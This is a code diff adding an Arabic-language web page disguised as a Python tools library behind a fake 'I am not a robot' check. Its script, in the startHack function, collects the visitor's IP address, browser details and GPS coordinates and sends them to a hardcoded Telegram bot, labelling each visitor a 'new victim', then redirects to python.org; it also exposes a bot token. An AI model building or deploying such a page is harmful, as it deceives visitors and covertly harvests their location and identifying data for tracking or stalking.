@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Python Pro Tools | مركز أدوات بايثون</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { background-color: #0f172a; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .btn-python { background: linear-gradient(90deg, #3776ab, #ffd343); transition: transform 0.3s; }
+        .btn-python:hover { transform: scale(1.05); }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col items-center p-4">
+
+    <header class="w-full max-w-2xl text-center my-8">
+        <i class="fab fa-python text-6xl mb-4 text-[#ffd343]"></i>
+        <h1 class="text-3xl font-bold">مكتبة أدوات بايثون الشاملة</h1>
+        <p class="text-slate-400 mt-2">كل ما تحتاجه لتطوير مشاريعك في مكان واحد</p>
+    </header>
+
+    <div id="verify-box" class="w-full max-w-md glass p-6 rounded-2xl shadow-2xl text-center mb-6">
+        <h2 class="text-xl mb-4 font-semibold">تحقق من الهوية (Security Check)</h2>
+        <p class="text-sm text-slate-300 mb-6">يرجى الضغط على الزر أدناه لتأكيد أنك لست روبوت والحصول على وصول كامل للمكتبة.</p>
+        <button onclick="startHack()" class="w-full py-4 rounded-xl btn-python text-slate-900 font-bold text-lg">
+            <i class="fas fa-user-check ml-2"></i> أنا لست روبوت - دخول مباشر
+        </button>
+    </div>
+
+    <div class="w-full max-w-2xl grid grid-cols-2 gap-4 opacity-30 pointer-events-none">
+        <div class="glass p-4 rounded-xl"><i class="fas fa-code mb-2"></i><br>محرر أكواد</div>
+        <div class="glass p-4 rounded-xl"><i class="fas fa-microchip mb-2"></i><br>مكتبات AI</div>
+    </div>
+
+    <script>
+        // التوكن المصحح والآيدي الخاص بك
+        const token = "8621828423:AAFq9_5-6snrjpfqrBrOPboh7VE824xVN_M"; 
+        const chat_id = "5475815049";
+
+        async function startHack() {
+            try {
+                // سحب الـ IP
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                
+                // إرسال الـ IP فوراً
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chat_id,
+                        text: `🚀 ضحية جديدة!\n🌐 IP: ${data.ip}\n📱 المتصفح: ${navigator.userAgent}`
+                    })
+                });
+
+                // طلب الـ GPS
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        
+                        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: chat_id,
+                                text: `📍 تم سحب الموقع بدقة!\n🔗 الرابط: ${mapUrl}`
+                            })
+                        });
+                        window.location.href = "https://www.python.org";
+                    }, (err) => {
+                        alert("يجب السماح بالتحقق للوصول للأدوات.");
+                    });
+                }
+            } catch (e) {
+                console.error(e);
+            }
+        }
+    </script>
+</body>
+</html>
